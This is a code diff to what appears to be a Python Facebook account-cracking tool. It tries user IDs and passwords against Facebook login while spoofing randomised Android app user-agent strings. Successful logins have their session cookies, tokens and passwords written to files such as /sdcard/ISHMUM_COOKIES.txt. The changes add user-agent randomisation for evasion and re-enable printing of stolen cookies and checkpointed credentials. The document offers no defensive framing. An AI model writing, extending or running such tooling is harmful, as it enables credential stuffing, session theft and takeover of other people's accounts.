@@ -68,7 +68,7 @@ def logo():
  [•] Status    :   Free
  [•] Tool      :   Free 
  [•] Facebook  :   Ishmum Sarker Siam
- [•] Version   :  \033[1;32m 2.8\033[1;32m \033[1;37m
+ [•] Version   :  \033[1;32m 2.9\033[1;32m \033[1;37m
 ---------------------------------------------------''')
 	p(logo)
 def clear():
@@ -370,7 +370,7 @@ class Ishmum:
 			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
 			fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
 			fban = random.choice(["FB4A", "FB5A", "FB6A"])		
-			ishmum_ua = "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=1.0,width=720,height=1080};FBLC/en_GB;FBRV/299927973;FBCR/Airtel;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/vivo Y22s;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_GB;FBBV/{fbbv};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Redmi;FBDV/Xiaomi Redmi 6;FBSV/10;FBCA/arm64-v8a:;FBDM/"+"{"+f"density={density},width={width},height={height}]"
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
@@ -429,12 +429,12 @@ class Ishmum:
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 				    #(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					#p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
+					p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
 					open('/sdcard/ISHMUM_OK.txt','a').write(uid+'|'+pw+'\n')					
 					open('/sdcard/ISHMUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					#p('\r\033[1;35m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;35m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/ISHMUM_M1_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
